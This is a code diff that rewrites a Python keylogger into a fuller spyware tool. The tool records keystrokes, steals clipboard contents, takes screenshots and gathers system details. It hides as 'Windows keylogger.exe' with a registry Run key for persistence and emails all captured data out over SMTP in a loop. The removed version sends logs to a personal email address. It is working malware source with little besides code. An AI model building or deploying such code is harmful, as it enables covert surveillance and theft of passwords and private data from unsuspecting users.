@@ -1,113 +1,167 @@
-import keyboard
-import smtplib
-import getpass
-import platform
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.image import MIMEImage
-from PIL import ImageGrab
-from threading import Timer
 import os
-import socket
-import sys
 import time
+import smtplib
+import keyboard
+import threading, sys
+import shutil, subprocess
+from PIL import ImageGrab
+from email import encoders
+import platform, pyperclip
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+import getpass, wmi, psutil, socket
+from email.mime.multipart import MIMEMultipart
 
-class Keylogger:
-    def __init__(self):
-        self.log_file = "keylog.txt"
-        self.screenshot_file = "screenshot.jpg"
-        self.sender_email = "email@email.com"
-        self.password = "email_password"
-        self.receiver_email = "abdulfarooqf8@gmail.com"
 
-    def start(self):
-        with open('keylog.txt', 'w') as file:
-            file.write(self.get_system_info())
-            file.write(self.get_network_info())
 
-        # Register Ctrl+Q key combination to quit the keylogger
-        keyboard.on_press(self.handle_ctrl_q)
+def get_system_info():
+    c = wmi.WMI()
+    my_system = c.Win32_ComputerSystem()[0]
+    info = f"Username: {getpass.getuser()}\n"
+    info += f"System: {platform.system()}\n"
+    info += f"Node Name: {platform.node()}\n"
+    info += f"Release: {platform.release()}\n"
+    info += f"Version: {platform.version()}\n"
+    info += f"Machine: {platform.machine()}\n"
+    info += f"Manufacturer: {my_system.Manufacturer}\n"
+    info +=f"Model: {my_system. Model}\n"
+    info +=f"NumberOfProcessors: {my_system.NumberOfProcessors}\n"
+    info +=f"SystemFamily: {my_system.SystemFamily}\n"
+    info += f"Processor: {platform.processor()}\n"
+    info += f"Architecture: {platform.architecture()}\n"
+    info += f"Platform: {platform.platform()}\n"
+    info +=(f"Physical cores: {psutil.cpu_count(logical=False)}\n")
+    info +=(f"Logical cores: {psutil.cpu_count(logical=True)}\n")
+    info +=(f"Current CPU frequency: {psutil.cpu_freq().current}\n")
+    info +=(f"Min CPU frequency: {psutil.cpu_freq().min}\n")
+    info +=(f"Max CPU frequency: {psutil.cpu_freq().max}\n")
+    info +=(f"Current CPU utilization: {psutil.cpu_percent(interval=1)}\n")
+    info +=(f"Current per-CPU utilization: {psutil.cpu_percent(interval=1, percpu=True)}\n")
+    info +=(f"Total RAM installed: {round(psutil.virtual_memory().total/1000000000, 2)} GB\n")
+    info +=(f"Available RAM: {round(psutil.virtual_memory().available/1000000000, 2)} GB\n")
+    info +=(f"Used RAM: {round(psutil.virtual_memory().used/1000000000, 2)} GB\n")
+    info +=(f"RAM usage: {psutil.virtual_memory().percent}%\n\n")
+    
+    return info
 
-        # Start recording the keys after a 21-second delay
-        Timer(21, keyboard.on_press, args=(self.record_keys,)).start()
+def get_network_info():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    return f"Hostname: {hostname}\nIP Address: {ip_address}\n\n"
 
-        # Start sending the keys and screenshot every 5 minutes  300sec
-        Timer(300, self.send_data).start()
+with open('key.txt', 'w') as file:
+            file.write(get_system_info())
+            file.write(get_network_info())
 
-        # Keep the program running
-        input("Press Enter to stop...")
+with open('clipboard.txt', 'w') as data:
+    data.write('Clipboard Data\n\n')
 
-    def record_keys(self, event):
-        if event.event_type == "down":
-            if event.name == "space":
-                key = " "
-            elif event.name == "enter":
-                key = "\n"
-            elif event.name == "backspace":
-                key = ' <-- '
-            elif event.name == "ctrl":
-                key = 'ctrl '
-            else:
-                key = event.name
-            
-            with open("keylog.txt", "a") as file:
-                file.write(key)
+def on_press(event):
+    if event.event_type == "down":
+        if event.name == "space":
+            key = " "
+        elif event.name == "enter":
+            key = "\n"
+        elif event.name == "backspace":
+            key = ' <-- '
+        elif event.name == "ctrl":
+            key = 'ctrl '
+        else:
+            key = event.name
+        
+        with open("key.txt", "a") as file:
+            file.write(key)
 
-    def send_data(self):
-        with open(self.log_file, "r") as file:
-            keys = file.read()
-        self.send_email("Key Log and Screenshot", keys)
-        Timer(300 self.send_data).start()
 
-    def send_email(self, subject, body):
-        message = MIMEMultipart()
-        message["From"] = self.sender_email
-        message["To"] = self.receiver_email
-        message["Subject"] = subject
+def screenshot():
+    image = ImageGrab.grab()
+    filename = "screenshot.png"
+    image.save(filename)
 
-        keylog_attachment = MIMEText(body, "plain")
-        message.attach(keylog_attachment)
+    time.sleep(25)
 
-        screenshot = ImageGrab.grab()
-        screenshot.save(self.screenshot_file)
 
-        with open(self.screenshot_file, "rb") as file:
-            screenshot_attachment = MIMEImage(file.read())
-        screenshot_attachment.add_header("Content-Disposition", "attachment", filename=self.screenshot_file)
-        message.attach(screenshot_attachment)
+def clipboard_steal():
+    
+    previous_clipboard_text = ''
+    while True:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text != previous_clipboard_text:
+            with open('clipboard.txt', 'a') as file:
+                file.write(clipboard_text + '\n')
+            previous_clipboard_text = clipboard_text
+        
+def become_persistent():    #persistence vid7
+    evil_file_location = os.environ['appdata'] + '\\Windows keylogger.exe'
+    if not os.path.exists(evil_file_location):
+        shutil.copyfile(sys.executable,evil_file_location)  #to run .py convert to __file__
+        subprocess.call('reg add HKCU\SOFTWARE\microsoft\windows\Currentversion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
-        while True:
-            try:
-                with smtplib.SMTP_SSL("smtp-relay.brevo.com", 587) as server:
-                    server.login(self.sender_email, self.password)
-                    server.sendmail(self.sender_email, self.receiver_email, message.as_string())
-                break
-            except smtplib.SMTPException:
-                time.sleep(60)
 
-        os.remove(self.screenshot_file)
-        os.remove(self.log_file)
-        sys.exit()
 
-    def get_system_info(self):
-        info = f"Username: {getpass.getuser()}\n"
-        info += f"System: {platform.system()}\n"
-        info += f"Node Name: {platform.node()}\n"
-        info += f"Release: {platform.release()}\n"
-        info += f"Version: {platform.version()}\n"
-        info += f"Machine: {platform.machine()}\n"
-        info += f"Processor: {platform.processor()}\n\n"
-        return info
+def send_email():
+    server = "mail.vitelglobal.com"
+    port = 587
+    sender = "youremail@gmail.com"
+    password = "password"
+    receiver = "receiver@email.com"
+    subject = "Screenshot, Clipboard Data and Keys"
+    message = "This is an automated email with a screenshot, clipboard data and a list of keys pressed."
 
-    def get_network_info(self):
-        hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
-        return f"Hostname: {hostname}\nIP Address: {ip_address}\n\n"
+    msg = MIMEMultipart()
+    msg["From"] = sender
+    msg["To"] = receiver
+    msg["Subject"] = subject
+    msg.attach(MIMEText(message, "plain"))
 
-    def handle_ctrl_q(self, event):
-        if event.name == 'q' and event.event_type == 'down' and 'ctrl' in keyboard._pressed_events:
-            sys.exit()
+    # Attach the files with path
+    file_attachments = [
+    {"filename": "screenshot.png", "path": "screenshot.png"},
+    {"filename": "key.txt", "path": "key.txt"},
+    {"filename": "clipboard.txt", "path": "clipboard.txt"}
+    ]
 
-# Create an instance of the Keylogger class and start the keylogging process
-keylogger = Keylogger()
-keylogger.start()
+    for file_attachment in file_attachments:
+        with open(file_attachment["path"], "rb") as file:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(file.read())
+            encoders.encode_base64(part)
+            part.add_header("Content-Disposition", f"attachment; filename={file_attachment['filename']}")
+            msg.attach(part)
+
+
+    try:
+        server = smtplib.SMTP(server, port)
+        server.starttls()
+        server.login(sender, password)
+        time.sleep(21)
+        server.sendmail(sender, receiver, msg.as_string())
+        server.quit()
+    except Exception as e:
+        # print("Error sending email, trying again in 60 seconds...")
+        time.sleep(60)
+        send_email()
+
+def main():
+    # Create a thread to capture screenshots every 5 minutes
+    screenshot_thread = threading.Thread(target=screenshot)
+    screenshot_thread.daemon = False
+    screenshot_thread.start()
+    status_thread = threading.Thread(target=clipboard_steal)
+    status_thread.daemon = True
+    status_thread.start()
+
+    # Register the callback
+    keyboard.on_press(on_press)
+
+    become_persistent()
+    # Send the email every 5 minutes
+    while True:
+        screenshot()
+        send_email()
+        # print("Email sent successfully!")
+        time.sleep(40)  # 300 seconds = 5 minutes
+        os.remove('screenshot.png')
+
+if __name__ == "__main__":
+    main()
